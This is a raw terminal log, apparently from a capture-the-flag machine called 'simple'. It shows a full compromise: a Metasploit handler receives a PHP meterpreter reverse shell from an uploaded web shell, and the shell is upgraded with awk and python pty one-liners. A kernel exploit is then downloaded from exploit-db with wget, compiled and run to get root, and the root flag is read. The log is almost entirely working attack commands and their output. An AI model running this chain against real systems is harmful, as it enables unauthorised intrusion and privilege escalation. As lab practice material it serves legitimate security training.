```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.43.70
lhost => 192.168.43.70
msf exploit(multi/handler) > set lport 9898
lport => 9898
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.43.70:9898 
[*] Sending stage (37775 bytes) to 192.168.43.70
[*] Meterpreter session 1 opened (192.168.43.70:9898 -> 192.168.43.70:50812) at 2019-01-16 23:04:51 +0530

meterpreter > sysinfo
Computer    : simple
OS          : Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686
Meterpreter : php/linux
meterpreter > shell
Process 1511 created.
Channel 0 created.

awk 'BEGIN {system("/bin/bash")}'

python -c 'import pty ; pty.spawn("/bin/bash")'
www-data@simple:/var/www/html/uploads$ uname -a
uname -a
Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
www-data@simple:/var/www/html/uploads$ cat /etc/lsb-release
cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.2 LTS"
www-data@simple:/var/www/html/uploads$ awk 'BEGIN {system("/bin/bash")}'
awk 'BEGIN {system("/bin/bash")}'
www-data@simple:/var/www/html/uploads$ wget https://www.exploit-db.com/download/36746 -O app.c
<ml/uploads$ wget https://www.exploit-db.com/downloa                      d/36746 -O app.c
--2019-01-16 12:42:34--  https://www.exploit-db.com/download/36746
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8, 64:ff9b::c07c:f908
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5216 (5.1K) [application/txt]
Saving to: 'app.c'

 0% [                                       ] 0           --.-K/s         100%[======================================>] 5,216       --.-K/s   in 0s      

2019-01-16 12:42:36 (2.49 MB/s) - 'app.c' saved [5216/5216]

www-data@simple:/var/www/html/uploads$ gcc app.c -o app -static
gcc app.c -o app -static
app.c:17:3: warning: #warning this file must be compiled with -static [-Wcpp]
 # warning this file must be compiled with -static
   ^
www-data@simple:/var/www/html/uploads$ ./app
./app
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
# awk 'BEGIN {system("/bin/bash")}'
awk 'BEGIN {system("/bin/bash")}'
root@simple:/var/www/html/uploads# ls
ls
app  app.c  avatar_tikam_shell.php
root@simple:/var/www/html/uploads# ls -la
ls -la
total 752
drwxrwxrwx 2 root     root       4096 Jan 16 12:42 .
drwxrwxrwx 7 root     root       4096 Sep 10  2015 ..
-rwsr-xr-x 1 root     root     746987 Jan 16 12:42 app
-rw-r--r-- 1 www-data www-data   5216 Jan 16 12:42 app.c
-rw-r--r-- 1 www-data www-data   1114 Jan 16 12:17 avatar_tikam_shell.php
root@simple:/var/www/html/uploads# ls /root
ls /root
flag.txt
root@simple:/var/www/html/uploads# cat /root/flag.txt
cat /root/flag.txt
U wyn teh Interwebs!!1eleven11!!1!
Hack the planet!
root@simple:/var/www/html/uploads# 

```